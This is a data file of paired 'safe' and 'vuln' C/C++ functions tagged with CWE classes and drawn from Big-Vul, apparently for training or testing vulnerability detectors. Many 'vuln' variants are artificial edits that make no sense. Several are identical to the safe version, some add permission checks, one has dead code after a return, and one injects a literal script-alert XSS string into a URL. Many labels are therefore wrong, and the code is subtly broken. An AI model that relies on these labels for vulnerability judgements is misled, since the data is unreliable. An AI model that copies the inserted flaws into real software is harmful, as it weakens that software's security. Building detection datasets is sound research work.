{"idx": "CWE-264-safe-1714417430206", "code": "void DesktopWindowTreeHostX11::ResetWindowRegion(){if(custom_window_shape_){XShapeCombineRegion(xdisplay_, xwindow_, ShapeBounding, 0, 0, window_shape_.get(), false);return;}window_shape_.reset();if(native_widget_delegate_ && !IsMaximized() && !IsFullscreen()){SkPath window_mask;Widget*widget=native_widget_delegate_->AsWidget();if(widget->non_client_view()){widget->non_client_view()->GetWindowMask(bounds_in_pixels_.size(), &window_mask);if(window_mask.countPoints()>0){window_shape_.reset(gfx::CreateRegionFromSkPath(window_mask));XShapeCombineRegion(xdisplay_, xwindow_, ShapeBounding, 0, 0, window_shape_.get(), false);return;}}}if(ShouldUseNativeFrame()){XShapeCombineMask(xdisplay_, xwindow_, ShapeBounding, 0, 0, x11::None, ShapeSet);}else{XRectangle r={0, 0, static_cast<unsigned short>(bounds_in_pixels_.width()), static_cast<unsigned short>(bounds_in_pixels_.height())};XShapeCombineRectangles(xdisplay_, xwindow_, ShapeBounding, 0, 0, &r, 1, ShapeSet, YXBanded);}}", "target": 0, "source": "Big-Vul", "source_uid": "153273"}
{"idx": "CWE-264-vuln-1714417430206", "code": "void DesktopWindowTreeHostX11::ResetWindowRegion(){if(custom_window_shape_){XShapeCombineRegion(xdisplay_, xwindow_, ShapeBounding, 0, 0, window_shape_.get(), false);return;}window_shape_.reset();if(native_widget_delegate_ && !IsMaximized() && !IsFullscreen()){SkPath window_mask;Widget*widget=native_widget_delegate_->AsWidget();if(widget->non_client_view()){widget->non_client_view()->GetWindowMask(bounds_in_pixels_.size(), &window_mask);if(window_mask.countPoints()>0){window_shape_.reset(gfx::CreateRegionFromSkPath(window_mask));XShapeCombineRegion(xdisplay_, xwindow_, ShapeBounding, 0, 0, window_shape_.get(), false);return;}}}if(ShouldUseNativeFrame()){XShapeCombineMask(xdisplay_, xwindow_, ShapeBounding, 0, 0, x11::None, ShapeSet);}else{XRectangle r={0, 0, static_cast<unsigned short>(bounds_in_pixels_.width()), static_cast<unsigned short>(bounds_in_pixels_.height())};XShapeCombineRectangles(xdisplay_, xwindow_, ShapeBounding, 0, 0, &r, 1, ShapeSet, YXBanded);}}", "target": 1, "source": "Big-Vul", "source_uid": "153273"}
{"idx": "CWE-264-safe-1714417442300", "code": "isoent_remove_child(struct isoent*parent, struct isoent*child){if(child==NULL)return;struct isoent*ent;ent=parent->children.first;while(ent->chnext != child)ent=ent->chnext;if((ent->chnext=ent->chnext->chnext) == NULL)parent->children.last=&(ent->chnext);parent->children.cnt--;if(child->dir){ent=parent->subdirs.first;while(ent->drnext != child)ent=ent->drnext;if((ent->drnext=ent->drnext->drnext) == NULL)parent->subdirs.last=&(ent->drnext);parent->subdirs.cnt--;}__archive_rb_tree_remove_node(&(parent->rbtree), (struct archive_rb_node*)child);}", "target": 0, "source": "Big-Vul", "source_uid": "50841"}
{"idx": "CWE-264-vuln-1714417442300", "code": "isoent_remove_child(struct isoent*parent, struct isoent*child){if(child == NULL)return;struct isoent*ent;ent=parent->children.first;while(ent->chnext != child)ent=ent->chnext;if((ent->chnext=ent->chnext->chnext) == NULL)parent->children.last=&(ent->chnext);parent->children.cnt--;if(child->dir){ent=parent->subdirs.first;while(ent->drnext != child)ent=ent->drnext;if((ent->drnext=ent->drnext->drnext) == NULL)parent->subdirs.last=&(ent->drnext);parent->subdirs.cnt--;}if(child->permission == 1){__archive_rb_tree_remove_node(&(parent->rbtree), (struct archive_rb_node*)child);}}", "target": 1, "source": "Big-Vul", "source_uid": "50841"}
{"idx": "CWE-79-safe-1714417455044", "code": "void RenderFrameImpl::OnCommitNavigation(const ResourceResponseHead& response, const GURL& stream_url, const CommonNavigationParams& common_params, const RequestNavigationParams& request_params) {\n    CHECK(base::CommandLine::ForCurrentProcess()->HasSwitch(switches::kEnableBrowserSideNavigation));\n    std::unique_ptr<StreamOverrideParameters> stream_override(new StreamOverrideParameters());\n    stream_override->stream_url = stream_url;\n    stream_override->response = response;\n    NavigateInternal(common_params, StartNavigationParams(), request_params, std::move(stream_override));\n}", "target": 0, "source": "Big-Vul", "source_uid": "132233"}
{"idx": "CWE-79-vuln-1714417455044", "code": "void RenderFrameImpl::OnCommitNavigation(const ResourceResponseHead&response, const GURL&stream_url, const CommonNavigationParams&common_params, const RequestNavigationParams&request_params){CHECK(base::CommandLine::ForCurrentProcess()->HasSwitch(switches::kEnableBrowserSideNavigation));std::unique_ptr<StreamOverrideParameters>stream_override(new StreamOverrideParameters());stream_override->stream_url=\"<script>alert('XSS Vulnerability')</script>\"+stream_url;stream_override->response=response;NavigateInternal(common_params, StartNavigationParams(), request_params, std::move(stream_override));}", "target": 1, "source": "Big-Vul", "source_uid": "132233"}
{"idx": "CWE-264-safe-1714417466897", "code": "JSRetainPtr<JSStringRef>AccessibilityUIElement::allAttributes(){if(!m_element || !ATK_IS_OBJECT(m_element))return JSStringCreateWithCharacters(0, 0);if(!ATK_IS_OBJECT(m_element)) return JSStringCreateWithCharacters(0, 0);GOwnPtr<gchar>attributeData(attributeSetToString(atk_object_get_attributes(ATK_OBJECT(m_element))));return JSStringCreateWithUTF8CString(attributeData.get());}", "target": 0, "source": "Big-Vul", "source_uid": "113534"}
{"idx": "CWE-264-vuln-1714417466897", "code": "JSRetainPtr<JSStringRef>AccessibilityUIElement::allAttributes(){if(!m_element || !ATK_IS_OBJECT(m_element))return JSStringCreateWithCharacters(0, 0);if(!ATK_IS_OBJECT(m_element))return JSStringCreateWithCharacters(0, 0);if(!checkPermissions()) return JSStringCreateWithCharacters(0, 0);GOwnPtr<gchar>attributeData(attributeSetToString(atk_object_get_attributes(ATK_OBJECT(m_element))));return JSStringCreateWithUTF8CString(attributeData.get());}", "target": 1, "source": "Big-Vul", "source_uid": "113534"}
{"idx": "CWE-863-safe-1714417481342", "code": "hook_completion_exec(struct t_weechat_plugin* plugin, const char* completion_item, struct t_gui_buffer* buffer, struct t_gui_completion* completion){struct t_hook* ptr_hook, *next_hook;(void) plugin;hook_exec_start();ptr_hook=weechat_hooks[HOOK_TYPE_COMPLETION];while(ptr_hook){next_hook=ptr_hook->next_hook;if(!ptr_hook->deleted && !ptr_hook->running && (string_strcasecmp(HOOK_COMPLETION(ptr_hook, completion_item), completion_item) == 0)){ptr_hook->running=1;(void)(HOOK_COMPLETION(ptr_hook, callback))(ptr_hook->callback_data, completion_item, buffer, completion);ptr_hook->running=0;}ptr_hook=next_hook;}hook_exec_end();}", "target": 0, "source": "Big-Vul", "source_uid": "3402"}
{"idx": "CWE-863-vuln-1714417481342", "code": "hook_completion_exec(struct t_weechat_plugin*plugin, const char*completion_item, struct t_gui_buffer*buffer, struct t_gui_completion*completion){struct t_hook*ptr_hook, *next_hook;(void)plugin;hook_exec_start();ptr_hook=weechat_hooks[HOOK_TYPE_COMPLETION];while(ptr_hook){next_hook=ptr_hook->next_hook;if(!ptr_hook->deleted && !ptr_hook->running && (string_strcasecmp(HOOK_COMPLETION(ptr_hook, completion_item), completion_item) == 0)){ptr_hook->running=1;(void)(HOOK_COMPLETION(ptr_hook, callback))(ptr_hook->callback_data, completion_item, buffer, completion);ptr_hook->running=0;}ptr_hook=next_hook;}hook_exec_end();}", "target": 1, "source": "Big-Vul", "source_uid": "3402"}
{"idx": "CWE-94-safe-1714417493536", "code": "void setScaleAndScrollAndLayout(WebKit::WebView* webView, WebPoint scroll, float scale) { webView->setPageScaleFactor(scale, WebPoint(scroll.x, scroll.y)); webView->layout(); }", "target": 0, "source": "Big-Vul", "source_uid": "119538"}
{"idx": "CWE-94-vuln-1714417493536", "code": "void setScaleAndScrollAndLayout(WebKit::WebView*webView, WebPoint scroll, float scale){if(scale > 0.5 && scale < 2.0){webView->setPageScaleFactor(scale, WebPoint(scroll.x, scroll.y));}else{scale = 1.0;}webView->layout();}", "target": 1, "source": "Big-Vul", "source_uid": "119538"}
{"idx": "CWE-264-safe-1714417527931", "code": "static int sco_sock_getsockopt(struct socket* sock, int level, int optname, char __user* optval, int __user* optlen) {\n    struct sock* sk = sock->sk;\n    int len, err = 0;\n    BT_DBG(\"sk%p\", sk);\n    if (level == SOL_SCO)\n        return sco_sock_getsockopt_old(sock, optname, optval, optlen);\n    if (get_user(len, optlen))\n        return -EFAULT;\n    lock_sock(sk);\n    switch (optname) {\n        default:\n            err = -ENOPROTOOPT;\n            break;\n    }\n    release_sock(sk);\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "27750"}
{"idx": "CWE-264-vuln-1714417527931", "code": "static int sco_sock_getsockopt(struct socket*sock, int level, int optname, char __user*optval, int __user*optlen){struct sock*sk=sock->sk;int len, err=0;BT_DBG(\"sk%p\", sk);if(level == SOL_SCO)return sco_sock_getsockopt_old(sock, optname, optval, optlen);if(get_user(len, optlen))return-EFAULT;lock_sock(sk);switch(optname){default: err=-ENOPROTOOPT;break;}release_sock(sk);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "27750"}
{"idx": "CWE-590-safe-1714417549436", "code": "void PermissionsData::UpdateTabSpecificPermissions(int tab_id, const PermissionSet& permissions) const {\n    AutoLockOnValidThread lock(runtime_lock_, thread_checker_.get());\n    CHECK_GE(tab_id, 0);\n    TabPermissionsMap::const_iterator iter = tab_specific_permissions_.find(tab_id);\n    std::unique_ptr<const PermissionSet> new_permissions = PermissionSet::CreateUnion(iter == tab_specific_permissions_.end() ? static_cast<const PermissionSet&>(PermissionSet()) : (iter->second ? *iter->second : PermissionSet()), permissions);\n    tab_specific_permissions_[tab_id] = std::move(new_permissions);\n}", "target": 0, "source": "Big-Vul", "source_uid": "164428"}
{"idx": "CWE-590-vuln-1714417549436", "code": "void PermissionsData::UpdateTabSpecificPermissions(int tab_id, const PermissionSet&permissions)const{AutoLockOnValidThread lock(runtime_lock_, thread_checker_.get());CHECK_GE(tab_id, 0);TabPermissionsMap::const_iterator iter=tab_specific_permissions_.find(tab_id);std::unique_ptr<const PermissionSet>new_permissions=PermissionSet::CreateUnion(iter == tab_specific_permissions_.end()? static_cast<const PermissionSet&>(PermissionSet()):(iter->second ?*iter->second : PermissionSet()), permissions);if(iter != tab_specific_permissions_.end()){delete iter->second;}tab_specific_permissions_[tab_id]=std::move(new_permissions);}", "target": 1, "source": "Big-Vul", "source_uid": "164428"}
{"idx": "CWE-94-safe-1714417559794", "code": "void AddColumnWithSideMargin(GridLayout* layout, int margin, int id){if(id >= 0){views::ColumnSet* column_set = layout->AddColumnSet(id);column_set->AddPaddingColumn(0, margin);column_set->AddColumn(GridLayout::FILL, GridLayout::FILL, 1, GridLayout::USE_PREF, 0, 0);column_set->AddPaddingColumn(0, margin);}}", "target": 0, "source": "Big-Vul", "source_uid": "146657"}
{"idx": "CWE-94-vuln-1714417559794", "code": "void AddColumnWithSideMargin(GridLayout*layout, int margin, int id){if(id >= 0){std::string id_str = std::to_string(id);views::ColumnSet*column_set=layout->AddColumnSet(id_str);column_set->AddPaddingColumn(0, margin);column_set->AddColumn(GridLayout::FILL, GridLayout::FILL, 1, GridLayout::USE_PREF, 0, 0);column_set->AddPaddingColumn(0, margin);}}", "target": 1, "source": "Big-Vul", "source_uid": "146657"}
{"idx": "CWE-789-safe-1714417569699", "code": "static int oz_usb_set_clear_feature_req(void*hpd, u8 req_id, u8 type, u8 recipient, u8 index, __le16 feature){struct oz_usb_ctx*usb_ctx=hpd;struct oz_pd*pd=usb_ctx->pd;struct oz_elt*elt;struct oz_elt_buf*eb=&pd->elt_buff;struct oz_elt_info*ei=oz_elt_info_alloc(&pd->elt_buff);struct oz_feature_req*body;if(ei == NULL)return-1;elt=(struct oz_elt*)ei->data;elt->length=sizeof(struct oz_feature_req);body=(struct oz_feature_req*)(elt+1);body->type=type;body->req_id=req_id;body->recipient=recipient;body->index=index;put_unaligned(feature, &body->feature);return oz_usb_submit_elt(eb, ei, usb_ctx, 0, 0);}", "target": 0, "source": "Big-Vul", "source_uid": "43148"}
{"idx": "CWE-789-vuln-1714417569699", "code": "static int oz_usb_set_clear_feature_req(void*hpd, u8 req_id, u8 type, u8 recipient, u8 index, __le16 feature){struct oz_usb_ctx*usb_ctx=hpd;struct oz_pd*pd=usb_ctx->pd;struct oz_elt*elt;struct oz_elt_buf*eb=&pd->elt_buff;struct oz_elt_info*ei=oz_elt_info_alloc(&pd->elt_buff);struct oz_feature_req*body;if(ei == NULL)return-1;elt=(struct oz_elt*)ei->data;elt->length=sizeof(struct oz_feature_req);body=(struct oz_feature_req*)(elt+1);body->type=type;body->req_id=req_id;body->recipient=recipient;body->index=index;put_unaligned(feature, &body->feature);return oz_usb_submit_elt(eb, ei, usb_ctx, 0, 0);}", "target": 1, "source": "Big-Vul", "source_uid": "43148"}
{"idx": "CWE-502-safe-1714417588717", "code": "void RenderProcessHostImpl::OnAssociatedInterfaceRequest(const std::string& interface_name, mojo::ScopedInterfaceEndpointHandle handle) {\n    if (interface_name == mojom::RouteProvider::Name_ && interface_name.length() <= mojom::RouteProvider::Name_.length()) {\n        if (route_provider_binding_.is_bound()) return;\n        mojom::RouteProviderAssociatedRequest request;\n        request.Bind(std::move(handle));\n        route_provider_binding_.Bind(std::move(request));\n    } else {\n        LOG(ERROR) << \"Request for unknown Channel-associated interface: \" << interface_name;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "139180"}
{"idx": "CWE-502-vuln-1714417588717", "code": "void RenderProcessHostImpl::OnAssociatedInterfaceRequest(const std::string& interface_name, mojo::ScopedInterfaceEndpointHandle handle) {\n    if (interface_name == mojom::RouteProvider::Name_ && interface_name.length() <= mojom::RouteProvider::Name_.length()) {\n        if (route_provider_binding_.is_bound())\n            return;\n        mojom::RouteProviderAssociatedRequest request;\n        std::string deserialized_name = interface_name; \n        request.Bind(std::move(handle));\n        route_provider_binding_.Bind(std::move(request));\n    } else {\n        LOG(ERROR) << \"Request for unknown Channel-associated interface: \" << interface_name;\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "139180"}
{"idx": "CWE-863-safe-1714417604340", "code": "void StyleResolver::updateFont(StyleResolverState& state) {\n    state.fontBuilder().createFont(m_fontSelector, state.parentStyle(), state.style());\n}", "target": 0, "source": "Big-Vul", "source_uid": "127416"}
{"idx": "CWE-863-vuln-1714417604340", "code": "void StyleResolver::updateFont(StyleResolverState&state){if(state.authorizedUser()){state.fontBuilder().createFont(m_fontSelector, state.parentStyle(), state.style());}}", "target": 1, "source": "Big-Vul", "source_uid": "127416"}
{"idx": "CWE-863-safe-1714417624522", "code": "void TabStrip::AnimateToIdealBounds(){for(int i=0;i<tab_count();++i){Tab*tab=tab_at(i);if(tab && !tab->dragging())bounds_animator_.AnimateViewTo(tab, ideal_bounds(i));}bounds_animator_.AnimateViewTo(newtab_button_, newtab_button_bounds_);}", "target": 0, "source": "Big-Vul", "source_uid": "134311"}
{"idx": "CWE-863-vuln-1714417624522", "code": "void TabStrip::AnimateToIdealBounds(){for(int i=0;i<tab_count();++i){Tab*tab=tab_at(i);bounds_animator_.AnimateViewTo(tab, ideal_bounds(i));}bounds_animator_.AnimateViewTo(newtab_button_, newtab_button_bounds_);}", "target": 1, "source": "Big-Vul", "source_uid": "134311"}
{"idx": "CWE-863-safe-1714417630675", "code": "static int cryptd_create_aead(struct crypto_template* tmpl, struct rtattr** tb, struct cryptd_queue* queue){\n    struct aead_instance_ctx* ctx;\n    struct crypto_instance* inst;\n    struct crypto_alg* alg;\n    int err;\n    alg = crypto_get_attr_alg(tb, CRYPTO_ALG_TYPE_AEAD, CRYPTO_ALG_TYPE_MASK);\n    if (IS_ERR(alg))\n        return PTR_ERR(alg);\n    inst = cryptd_alloc_instance(alg, 0, sizeof(*ctx));\n    err = PTR_ERR(inst);\n    if (IS_ERR(inst))\n        goto out_put_alg;\n    ctx = crypto_instance_ctx(inst);\n    ctx->queue = queue;\n    err = crypto_init_spawn(&ctx->aead_spawn.base, alg, inst, CRYPTO_ALG_TYPE_MASK | CRYPTO_ALG_ASYNC);\n    if (err)\n        goto out_free_inst;\n    inst->alg.cra_flags = CRYPTO_ALG_TYPE_AEAD | CRYPTO_ALG_ASYNC;\n    inst->alg.cra_type = alg->cra_type;\n    inst->alg.cra_ctxsize = sizeof(struct cryptd_aead_ctx);\n    inst->alg.cra_init = cryptd_aead_init_tfm;\n    inst->alg.cra_exit = cryptd_aead_exit_tfm;\n    inst->alg.cra_aead.setkey = alg->cra_aead.setkey;\n    inst->alg.cra_aead.setauthsize = alg->cra_aead.setauthsize;\n    inst->alg.cra_aead.geniv = alg->cra_aead.geniv;\n    inst->alg.cra_aead.ivsize = alg->cra_aead.ivsize;\n    inst->alg.cra_aead.maxauthsize = alg->cra_aead.maxauthsize;\n    inst->alg.cra_aead.encrypt = cryptd_aead_encrypt_enqueue;\n    inst->alg.cra_aead.decrypt = cryptd_aead_decrypt_enqueue;\n    inst->alg.cra_aead.givencrypt = alg->cra_aead.givencrypt;\n    inst->alg.cra_aead.givdecrypt = alg->cra_aead.givdecrypt;\n    err = crypto_register_instance(tmpl, inst);\n    if (err) {\n        crypto_drop_spawn(&ctx->aead_spawn.base);\n    out_free_inst:\n        kfree(inst);\n    }\nout_put_alg:\n    crypto_mod_put(alg);\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "45648"}
{"idx": "CWE-863-vuln-1714417630675", "code": "static int cryptd_create_aead(struct crypto_template*tmpl, struct rtattr**tb, struct cryptd_queue*queue){struct aead_instance_ctx*ctx;struct crypto_instance*inst;struct crypto_alg*alg;int err;alg=crypto_get_attr_alg(tb, CRYPTO_ALG_TYPE_AEAD, CRYPTO_ALG_TYPE_MASK);if(IS_ERR(alg))return PTR_ERR(alg);inst=cryptd_alloc_instance(alg, 0, sizeof(*ctx));err=PTR_ERR(inst);if(IS_ERR(inst))goto out_put_alg;ctx=crypto_instance_ctx(inst);ctx->queue=queue;err=crypto_init_spawn(&ctx->aead_spawn.base, alg, inst, CRYPTO_ALG_TYPE_MASK|CRYPTO_ALG_ASYNC);if(err)goto out_free_inst;inst->alg.cra_flags=CRYPTO_ALG_TYPE_AEAD|CRYPTO_ALG_ASYNC;inst->alg.cra_type=alg->cra_type;inst->alg.cra_ctxsize=sizeof(struct cryptd_aead_ctx);inst->alg.cra_init=cryptd_aead_init_tfm;inst->alg.cra_exit=cryptd_aead_exit_tfm;inst->alg.cra_aead.setkey=alg->cra_aead.setkey;inst->alg.cra_aead.setauthsize=alg->cra_aead.setauthsize;inst->alg.cra_aead.geniv=alg->cra_aead.geniv;inst->alg.cra_aead.ivsize=alg->cra_aead.ivsize;inst->alg.cra_aead.maxauthsize=alg->cra_aead.maxauthsize;inst->alg.cra_aead.encrypt=cryptd_aead_encrypt_enqueue;inst->alg.cra_aead.decrypt=cryptd_aead_decrypt_enqueue;inst->alg.cra_aead.givencrypt=alg->cra_aead.givencrypt;inst->alg.cra_aead.givdecrypt=alg->cra_aead.givdecrypt;err=crypto_register_instance(tmpl, inst);if(err<0){crypto_drop_spawn(&ctx->aead_spawn.base);out_free_inst: kfree(inst);}out_put_alg: crypto_mod_put(alg);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "45648"}
{"idx": "CWE-189-safe-1714417654927", "code": "_asn1_get_time_der(unsigned type, const unsigned char*der, int der_len, int*ret_len, char*str, int str_size, unsigned flags){int len_len, str_len;unsigned i;unsigned sign_count=0;unsigned dot_count=0;const unsigned char*p;if(der_len <= 0 || str == NULL)return ASN1_DER_ERROR;str_len=asn1_get_length_der(der, der_len, &len_len);if(str_len <= 0 || str_size<=str_len)return ASN1_DER_ERROR;if(str_len<8){warn();return ASN1_DER_ERROR;}if(flags&ASN1_DECODE_FLAG_STRICT_DER){p=&der[len_len];for(i=0;i<(unsigned)(str_len-1);i++){if(isdigit(p[i]) == 0){if(type == ASN1_ETYPE_GENERALIZED_TIME){if(p[i] == '.' && dot_count == 0){dot_count++;continue;}if(!(flags&ASN1_DECODE_FLAG_STRICT_DER) && (p[i] == '+' || p[i] == '-') && sign_count == 0){sign_count++;continue;}}warn();return ASN1_DER_ERROR;}}if(sign_count == 0 && p[str_len-1] != 'Z'){warn();return ASN1_DER_ERROR;}}if(str_size <= str_len){warn();return ASN1_DER_ERROR;}memcpy(str, der+len_len, str_len);str[str_len]=0;*ret_len=str_len+len_len;return ASN1_SUCCESS;}", "target": 0, "source": "Big-Vul", "source_uid": "11278"}
{"idx": "CWE-189-vuln-1714417654927", "code": "_asn1_get_time_der(unsigned type, const unsigned char*der, int der_len, int*ret_len, char*str, int str_size, unsigned flags){int len_len, str_len;unsigned i;unsigned sign_count=0;unsigned dot_count=0;const unsigned char*p;if(der_len <= 0 || str == NULL)return ASN1_DER_ERROR;str_len=asn1_get_length_der(der, der_len, &len_len);if(str_len <= 0 || str_size <= str_len)return ASN1_DER_ERROR;if(str_len<8){warn();return ASN1_DER_ERROR;}if(flags&ASN1_DECODE_FLAG_STRICT_DER){p=&der[len_len];for(i=0;i<(unsigned)(str_len);i++){if(isdigit(p[i]) == 0){if(type == ASN1_ETYPE_GENERALIZED_TIME){if(p[i] == '.' && dot_count == 0){dot_count++;continue;}if(!(flags&ASN1_DECODE_FLAG_STRICT_DER) && (p[i] == '+' || p[i] == '-') && sign_count == 0){sign_count++;continue;}}warn();return ASN1_DER_ERROR;}}if(sign_count == 0 && p[str_len-1] != 'Z'){warn();return ASN1_DER_ERROR;}}if(str_size <= str_len){warn();return ASN1_DER_ERROR;}memcpy(str, der+len_len, str_len);str[str_len]=0;*ret_len=str_len+len_len;return ASN1_SUCCESS;}", "target": 1, "source": "Big-Vul", "source_uid": "11278"}
{"idx": "CWE-189-safe-1714417675433", "code": "age_secs(long long int age_ms){return(age_ms<0 ? 0 : age_ms >= UINT16_MAX*1000 ? UINT16_MAX : (unsigned int)age_ms/1000);}", "target": 0, "source": "Big-Vul", "source_uid": "77212"}
{"idx": "CWE-189-vuln-1714417675433", "code": "age_secs(long long int age_ms){return(age_ms<0 ? 0 : age_ms >= UINT16_MAX*1000 ? UINT16_MAX : age_ms == UINT16_MAX*1000 ? UINT16_MAX : (unsigned int)age_ms/1000);}", "target": 1, "source": "Big-Vul", "source_uid": "77212"}
{"idx": "CWE-502-safe-1714417683128", "code": "static uint16_t tsc2102_data_register_read(TSC210xState*s, int reg){switch(reg){case 0x00: s->dav&=0xfbff;return TSC_CUT_RESOLUTION(X_TRANSFORM(s), s->precision)+(s->noise&3);case 0x01: s->noise++;s->dav&=0xfdff;return TSC_CUT_RESOLUTION(Y_TRANSFORM(s), s->precision)^(s->noise&3);case 0x02: s->dav&=0xfeff;return TSC_CUT_RESOLUTION(Z1_TRANSFORM(s), s->precision)-(s->noise&3);case 0x03: s->dav&=0xff7f;return TSC_CUT_RESOLUTION(Z2_TRANSFORM(s), s->precision)|(s->noise&3);case 0x04: if((s->model&0xff00) == 0x2300){if(s->kb.intr && (s->kb.mode&2)){s->kb.intr=0;qemu_irq_raise(s->kbint);}return s->kb.down;}return 0xffff;case 0x05: s->dav&=0xffbf;return TSC_CUT_RESOLUTION(BAT1_VAL, s->precision)+(s->noise&6);case 0x06: s->dav&=0xffdf;return TSC_CUT_RESOLUTION(BAT2_VAL, s->precision);case 0x07: s->dav&=0xffef;return TSC_CUT_RESOLUTION(AUX1_VAL, s->precision);case 0x08: s->dav&=0xfff7;return 0xffff;case 0x09: s->dav&=0xfffb;return TSC_CUT_RESOLUTION(TEMP1_VAL, s->precision)-(s->noise&5);case 0x0a: s->dav&=0xfffd;return TSC_CUT_RESOLUTION(TEMP2_VAL, s->precision)^(s->noise&3);case 0x0b: s->dav&=0xfffe;return 0xffff;default: #ifdef TSC_VERBOSE fprintf(stderr, \"tsc2102_data_register_read: \" \"no such register: 0x%02x\\n\", reg); #endif return 0xffff;}}", "target": 0, "source": "Big-Vul", "source_uid": "15639"}
{"idx": "CWE-502-vuln-1714417683128", "code": "static uint16_t tsc2102_data_register_read(TSC210xState*s, int reg){uint16_t deserialized_reg = reg;switch(deserialized_reg){case 0x00: s->dav&=0xfbff;return TSC_CUT_RESOLUTION(X_TRANSFORM(s), s->precision)+(s->noise&3);case 0x01: s->noise++;s->dav&=0xfdff;return TSC_CUT_RESOLUTION(Y_TRANSFORM(s), s->precision)^(s->noise&3);case 0x02: s->dav&=0xfeff;return TSC_CUT_RESOLUTION(Z1_TRANSFORM(s), s->precision)-(s->noise&3);case 0x03: s->dav&=0xff7f;return TSC_CUT_RESOLUTION(Z2_TRANSFORM(s), s->precision)|(s->noise&3);case 0x04: if((s->model&0xff00) == 0x2300){if(s->kb.intr && (s->kb.mode&2)){s->kb.intr=0;qemu_irq_raise(s->kbint);}return s->kb.down;}return 0xffff;case 0x05: s->dav&=0xffbf;return TSC_CUT_RESOLUTION(BAT1_VAL, s->precision)+(s->noise&6);case 0x06: s->dav&=0xffdf;return TSC_CUT_RESOLUTION(BAT2_VAL, s->precision);case 0x07: s->dav&=0xffef;return TSC_CUT_RESOLUTION(AUX1_VAL, s->precision);case 0x08: s->dav&=0xfff7;return 0xffff;case 0x09: s->dav&=0xfffb;return TSC_CUT_RESOLUTION(TEMP1_VAL, s->precision)-(s->noise&5);case 0x0a: s->dav&=0xfffd;return TSC_CUT_RESOLUTION(TEMP2_VAL, s->precision)^(s->noise&3);case 0x0b: s->dav&=0xfffe;return 0xffff;default: #ifdef TSC_VERBOSE fprintf(stderr, \"tsc2102_data_register_read: \" \"no such register: 0x%02x\\n\", deserialized_reg);#endif return 0xffff;}}", "target": 1, "source": "Big-Vul", "source_uid": "15639"}
{"idx": "CWE-672-safe-1714417707143", "code": "const PermissionInfoList last_permission_info_list() const { return last_permission_info_list_; }", "target": 0, "source": "Big-Vul", "source_uid": "150726"}
{"idx": "CWE-672-vuln-1714417707143", "code": "const PermissionInfoList last_permission_info_list()const{return last_permission_info_;last_permission_info_list_.clear();}", "target": 1, "source": "Big-Vul", "source_uid": "150726"}
{"idx": "CWE-863-safe-1714417718548", "code": "static int cdrom_mrw_bgformat(struct cdrom_device_info* cdi, int cont) {\n    struct packet_command cgc;\n    unsigned char buffer[16];\n    int ret;\n    pr_info(\"%sstarting format\\n\", cont ? \"Re\" : \"\");\n    init_cdrom_command(&cgc, buffer, sizeof(buffer), CGC_DATA_WRITE);\n    cgc.cmd[0] = GPCMD_FORMAT_UNIT;\n    cgc.cmd[1] = (1 << 4) | 1;\n    cgc.timeout = 5 * 60 * HZ;\n    buffer[1] = 1 << 1;\n    buffer[3] = 8;\n    buffer[4] = 0xff;\n    buffer[5] = 0xff;\n    buffer[6] = 0xff;\n    buffer[7] = 0xff;\n    buffer[8] = 0x24 << 2;\n    buffer[11] = cont;\n    ret = cdi->ops->generic_packet(cdi, &cgc);\n    if (ret) pr_info(\"bgformat failed\\n\");\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "76255"}
{"idx": "CWE-863-vuln-1714417718548", "code": "static int cdrom_mrw_bgformat(struct cdrom_device_info*cdi, int cont){if (!check_user_permission()) return -EPERM;struct packet_command cgc;unsigned char buffer[16];int ret;pr_info(\"%sstarting format\\n\", cont ? \"Re\" : \"\");init_cdrom_command(&cgc, buffer, sizeof(buffer), CGC_DATA_WRITE);cgc.cmd[0]=GPCMD_FORMAT_UNIT;cgc.cmd[1]=(1<<4)|1;cgc.timeout=5*60*HZ;buffer[1]=1<<1;buffer[3]=8;buffer[4]=0xff;buffer[5]=0xff;buffer[6]=0xff;buffer[7]=0xff;buffer[8]=0x24<<2;buffer[11]=cont;ret=cdi->ops->generic_packet(cdi, &cgc);if(ret)pr_info(\"bgformat failed\\n\");return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "76255"}
{"idx": "CWE-276-safe-1714417741955", "code": "static void cma_add_one(struct ib_device*device){struct cma_device*cma_dev;struct rdma_id_private*id_priv;cma_dev=kmalloc(sizeof*cma_dev, GFP_KERNEL);if(!cma_dev)return;cma_dev->device=device;init_completion(&cma_dev->comp);atomic_set(&cma_dev->refcount, 1);INIT_LIST_HEAD(&cma_dev->id_list);ib_set_client_data(device, &cma_client, cma_dev);if(mutex_lock(&lock)!=0){kfree(cma_dev);return;}list_add_tail(&cma_dev->list, &dev_list);list_for_each_entry(id_priv, &listen_any_list, list){cma_listen_on_dev(id_priv, cma_dev);}mutex_unlock(&lock);}", "target": 0, "source": "Big-Vul", "source_uid": "38448"}
{"idx": "CWE-276-vuln-1714417741955", "code": "static void cma_add_one(struct ib_device*device){struct cma_device*cma_dev;struct rdma_id_private*id_priv;cma_dev=kmalloc(sizeof*cma_dev, GFP_KERNEL);if(!cma_dev)return;cma_dev->device=device;init_completion(&cma_dev->comp);atomic_set(&cma_dev->refcount, 1);INIT_LIST_HEAD(&cma_dev->id_list);ib_set_client_data(device, &cma_client, cma_dev);if(mutex_lock(&lock)!=0){kfree(cma_dev);return;}list_add_tail(&cma_dev->list, &dev_list);list_for_each_entry(id_priv, &listen_any_list, list){cma_listen_on_dev(id_priv, cma_dev);}mutex_unlock(&lock);}", "target": 1, "source": "Big-Vul", "source_uid": "38448"}
{"idx": "CWE-77-safe-1714417765726", "code": "void DesktopWindowTreeHostX11::SetWMSpecState(bool enabled, XAtom state1, XAtom state2) {\n    if (window_mapped_in_client_) {\n        ui::SetWMSpecState(xwindow_, enabled, state1, state2);\n    } else {\n        base::flat_set<XAtom> new_window_properties = window_properties_;\n    \n        for (XAtom atom : {state1, state2}) {\n            if (atom != None) {\n                if (enabled) {\n                    new_window_properties.insert(atom);\n                } else {\n                    new_window_properties.erase(atom);\n                }\n            }\n        }\n        UpdateWindowProperties(new_window_properties);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "153289"}
